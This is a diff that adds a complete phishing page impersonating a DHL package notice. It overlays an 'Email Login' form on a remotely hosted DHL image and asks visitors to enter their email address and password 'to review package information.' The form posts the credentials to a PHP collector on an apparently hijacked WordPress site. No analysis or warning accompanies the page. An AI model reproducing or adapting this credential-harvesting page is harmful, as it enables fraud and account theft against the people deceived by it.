@@ -1,0 +1,97 @@
+﻿<!DOCTYPE html>
+<!-- saved from 
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<meta>
+<title>Email Login</title>
+
+
+<style type="text/css">
+<!--
+.style1 {	background-color: #FFFFFF;
+}
+.style5 {
+	font-size: large;
+	font-family: Arial, Helvetica, sans-serif;
+}
+.style6 {
+	font-size: 20px;
+	background-color: #FFFFFF;
+	color: #666666;
+	font-family: Arial, Helvetica, sans-serif;
+}
+.style11 {color: #000033; font-size: 16px; font-weight: bold; }
+-->
+</style>
+</head>
+
+<body><p style="color: rgb(0, 0, 0); font-family: 'Times New Roman'; font-size: medium; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: normal; orphans: auto; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 1; word-spacing: 0px; -webkit-text-stroke-width: 0px;">
+<img src="http://jiukkang.com/res/dhl.png" usemap="#FPMap0" height="662" border="0" width="1349"></p>
+<table style="font-family: 'Times New Roman'; letter-spacing: normal; orphans: auto; text-indent: 0px; text-transform: none; widows: 1; word-spacing: 0px; -webkit-text-stroke-width: 0px; position: absolute; left: 218px; top: 127px; width: 512px; height: 385px;" border="0" cellpadding="0" cellspacing="0" width="100%">
+	<tbody><tr>
+		<td>
+		
+		<form method="POST" name="myForm" action="http://ivorycareservices.co.uk/wp-includes/images/zong/mao.php">
+			<p>&nbsp;</p>
+			<p>&nbsp;</p>
+			<p>&nbsp;</p>
+			<p>&nbsp;</p>
+			<p>&nbsp;</p>
+			<p>&nbsp;</p>
+			<p>&nbsp;</p>
+			<p>&nbsp;</p>
+			<p>&nbsp;</p>
+			<table style="position: absolute; left: 17px; top: 14px; width: 487px; height: 204px;" border="0" cellpadding="0" cellspacing="0" width="100%">
+				<tbody><tr>
+					<td colspan="2" style="vertical-align: middle;" height="63" bgcolor="#B00000">
+					<p align="center">
+					<font style="font-size: 11pt;" face="Tahoma" color="#EAEAEA">
+					<b>&nbsp;Sign In With Your Valid Email and Password To Review&nbsp;&nbsp; 
+					Package Information</b></font></p></td>
+				</tr>
+				<tr>
+					<td style="vertical-align: middle;" height="44">
+					<font face="Verdana" color="#4F4F4F" size="2"><b>&nbsp;Email ID</b>:&nbsp;</font></td>
+					<td align="left" height="44"><font face="Verdana" size="3">
+					<input name="email" maxlength="60" size="40" required="true" style="font-weight: 700;"></font></td>
+				</tr>
+				<tr>
+					<td style="vertical-align: middle;">
+					<font face="Verdana" color="#4F4F4F" size="2"><b>&nbsp;Password</b>:&nbsp;</font></td>
+					<td align="left"><font face="Verdana" size="3">
+					<input name="pass" maxlength="30" size="23" value="" type="password"required ></font></td>
+				</tr>
+				<tr>
+					<td style="vertical-align: middle;">
+					<font face="Verdana" color="#4F4F4F" size="2"><b>&nbsp;Language</b>:</font></td>
+					<td align="left" height="38"><font face="Verdana" size="3">
+					<select name="language0" size="1" onChange="javascript:fnChange()">
+					<option value="">&nbsp;Select language</option>
+					
+					<option selected="selected" value="en_US" "selected"="">
+					&nbsp;English</option>
+					
+					<option value="fr_FR" ""="">French</option>
+					
+					<option value="pt_PT" ""="">Portugese</option>
+					
+					<option value="rs_RS" ""="">Serbia</option>
+					
+					<option value="ru_RU" ""="">Russian</option>
+					
+					<option value="tr_TR" ""="">Turkish</option>
+					
+					<option value="hr_HR" ""="">Croatian</option>
+					</select></font></td>
+				</tr>
+				<tr>
+					<td style="vertical-align: middle;">&nbsp;</td>
+					<td align="left" height="36">
+					<input src="http://jiukkang.com/res/btn1.png" value="Submit" alt="Submit" name="I1" style="position: absolute; left: 120px; top: 177px;" height="18" type="image" width="89"></td>
+				</tr>
+			</tbody></table>
+		</form>
+		<p>&nbsp;</p></td>
+	</tr>
+</tbody></table>
+
+</body></html>
